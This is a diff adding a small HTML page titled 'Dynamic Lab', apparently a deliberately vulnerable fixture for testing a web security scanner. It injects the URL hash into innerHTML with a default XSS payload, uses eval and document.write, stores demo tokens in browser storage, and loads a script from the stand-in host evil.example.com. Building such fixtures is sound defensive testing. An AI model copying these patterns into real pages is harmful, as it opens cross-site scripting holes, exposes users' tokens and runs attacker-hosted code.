@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Dynamic Lab</title>
+  </head>
+  <body>
+    <div id="app"></div>
+
+    <script>
+      const payload = location.hash.slice(1) || '<img src=x onerror=alert(1)>';
+
+      document.getElementById('app').innerHTML = payload;
+      document.write('<p>document.write called</p>');
+      eval("console.log('eval called')");
+      localStorage.setItem('token', 'demo-secret');
+      sessionStorage.setItem('jwt', 'demo-jwt');
+
+      const scriptA = document.createElement('script');
+      scriptA.src = 'https://cdn.example.com/library.js';
+      document.body.appendChild(scriptA);
+
+      const scriptB = document.createElement('script');
+      scriptB.setAttribute('src', 'https://evil.example.com/payload.js');
+      document.body.appendChild(scriptB);
+    </script>
+  </body>
+</html>
